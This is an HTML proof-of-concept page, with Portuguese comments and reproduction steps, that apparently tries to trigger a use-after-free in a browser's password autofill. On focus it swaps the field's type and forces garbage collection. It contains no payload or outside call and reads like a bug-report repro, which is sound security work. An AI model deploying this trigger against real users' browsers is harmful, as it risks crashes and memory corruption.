<!DOCTYPE html>
<html>
<head>
<script>
// Função para gerar pressão na memória (Garbage Collection)
function gc() {
    function gcRec(n) {
        if (n < 1) return;
        var temp = {i: "ab" + i + (i / 100000)};
        gcRec(n - 1);
    }
    for (var i = 0; i < 1000; i++) gcRec(10);
}

function setupVuln() {
    let input = document.getElementById("pw");
    
    // Adiciona o ouvinte para disparar O MAIS RÁPIDO POSSÍVEL quando o ícone for clicado/focado
    input.addEventListener("focus", function() {
        // Altera o tipo do input no meio do processamento do autofill
        input.type = "text";
        
        // Força a pressão na memória para tentar liberar o ponteiro do elemento interno
        gc();
    });
}
</script>
</head>
<body onload="setupVuln()">
    <h3>Instruções de Reprodução:</h3>
    <p>1. Salve uma senha de teste neste site antes para fazer o ícone de Autofill aparecer no campo abaixo.</p>
    <p>2. Clique <b>diretamente no ícone de chave/preenchimento automático</b> dentro do campo de senha.</p>
    
    <form>
        <input id="pw" type="password" name="password" autocomplete="current-password">
    </form>
</body>
</html>
